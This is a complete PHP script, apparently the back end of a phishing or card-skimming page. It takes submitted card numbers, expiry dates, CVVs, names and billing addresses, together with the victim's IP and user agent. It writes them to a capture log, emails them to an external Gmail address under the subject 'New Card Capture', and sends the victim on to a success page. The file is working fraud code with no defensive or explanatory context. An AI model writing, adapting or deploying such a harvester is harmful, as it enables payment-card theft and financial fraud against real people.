
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $data = [
        'card_number' => $_POST['card_number'] ?? 'N/A',
        'expiry' => $_POST['expiry'] ?? 'N/A',
        'cvv' => $_POST['cvv'] ?? 'N/A',
        'name' => $_POST['name'] ?? 'N/A',
        'billing_address' => $_POST['billing_address'] ?? 'N/A',
        'ip' => $_SERVER['REMOTE_ADDR'],
        'user_agent' => $_SERVER['HTTP_USER_AGENT'],
        'timestamp' => date('Y-m-d H:i:s')
    ];

    // Log to file
    file_put_contents('captures.log', json_encode($data) . PHP_EOL, FILE_APPEND);

    // Email the data
    $to = 'lindiwoods2@gmail.com'; // Your receiving email
    $subject = 'New Card Capture';
    $message = json_encode($data, JSON_PRETTY_PRINT);
    $headers = 'From: noreply@yourdomain.com' . "\r\n" .
               'Content-Type: text/plain; charset=UTF-8';

    // Use mail() with Gmail SMTP (configure php.ini for SMTP if needed, or use PHPMailer for reliability)
    mail($to, $subject, $message, $headers);

    // Redirect to success page
    header('Location: success.html');
    exit;
} else {
    // If accessed directly, redirect to index
    header('Location: index.html');
    exit;
}
?>
